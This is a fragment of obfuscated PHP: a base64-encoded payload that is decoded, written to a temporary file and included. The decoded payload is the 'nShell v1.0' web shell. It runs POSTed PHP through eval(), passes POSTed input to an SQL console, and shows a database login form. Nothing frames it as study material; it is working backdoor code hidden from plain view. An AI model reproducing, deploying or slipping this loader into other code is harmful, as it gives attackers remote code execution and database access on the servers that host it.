ICRmb3JtMjsKJHN0cj1AJF9QT1NUWydzdHInXTsKaWYoaXNzZXQoJHN0cikpIHNxbCgkc3RyKTsKCX0KCWVsc2UgewoJCWVjaG8gImNoYW8iOwoJCSRmb3JtMT0iPGNlbnRlcj48Zm9ybSBtZXRob2Q9R0VUIGFjdGlvbj0nIi4kX1NFUlZFUlsnUEhQX1NFTEYnXS4iJz48dGFibGUgd2lkdGg9MTAwJSBib2Rlcj0wPjx0ZCB3aWR0aD0xMDAlPiBVc2VyIE5hbWUgOiA8aW5wdXQgdHlwZT10ZXh0IG5hbWU9dW5hbWUgc2l6ZT0yMD4gU2VydmVyIE5hbWUgOjxpbnB1dCBuYW1lPXNybmFtZSB0eXBlPXRleHQgIHNpemU9MjI+PC90ZD48dHI+PHRkIHdpZHRoPTEwMCU+IFBhc3N3b3JkIDo8aW5wdXQgdHlwZT10ZXh0IG5hbWU9cGFzcyBzaXplPTIwPiBQb3J0IDogPGlucHV0IHR5cGU9dGV4dCBuYW1lPXBvcnQgc2l6ZT0yMD48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9bG9naW4+PC9mb3JtPjwvdGQ+PC9mb3JtPjwvdGFibGU+PGhyIGNvbG9yPTc3Nzc3NyB3aWR0aD0xMDAlIGhlaWdodD0xMTVweD4iOwogICAgICAgIGVjaG8gJGZvcm0xOwogICAgICAgICAgICAgfQp9Cj8+Cgo8P3BocAppZigkYWN0PT0iZXZhbCIpewokc2NyaXB0PSRfUE9TVFsnc2NyaXB0J107CmlmKCEkc2NyaXB0KXsKZWNobyAiPGhyIGNvbG9yPTc3Nzc3NyB3aWR0aD0xMDAlIGhlaWdodD0xMTVweD48Zm9ybSBhY3Rpb249Ii4kX1NFUlZFUlsnJ10uIiBtZXRob2Q9cG9zdD48VEVYVEFSRUEgTkFNRT1cIlwiIFJPV1M9XCI1XCIgQ09MUz1cIjYwXCI+PC9URVhUQVJFQT48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9RW50ZXI+PC9mb3JtPjxociBjb2xvcj03Nzc3Nzcgd2lkdGg9MTAwJSBoZWlnaHQ9MTE1cHg+IjsKfWVsc2V7CmV2YWwoJHNjcmlwdCk7Cn0KfQo/Pgo8L3RkPgo8L3RhYmxlPgoKPGZvbnQgZmFjZT1XZWJkaW5ncyBzaXplPTY+PGI+ITwvYj48L2ZvbnQ+PGI+PGZvbnQgY29sb3I9XCIjMDAwMDAwXCIgc2l6ZT1cIjNcIiBmYWNlPVwiR2VvcmdpYVwiPm5TaGVsbCB2MS4wLiBDb2RlIGJ5IE5hdmFyby48L2ZvbnQ+PGJyPjxiPjxmb250IGNvbG9yPSIjMDAwMDAwIiBmYWNlPSJHZW9yZ2lhIj5IYXZlIEZ1biAhIHteLl59IHsgfi5+fSA8L2ZvbnQ+PC9iPgo8L2NlbnRlcj4KPC9ib2R5PgoKCiAK');
file_put_contents($tmp, $c);
include $tmp;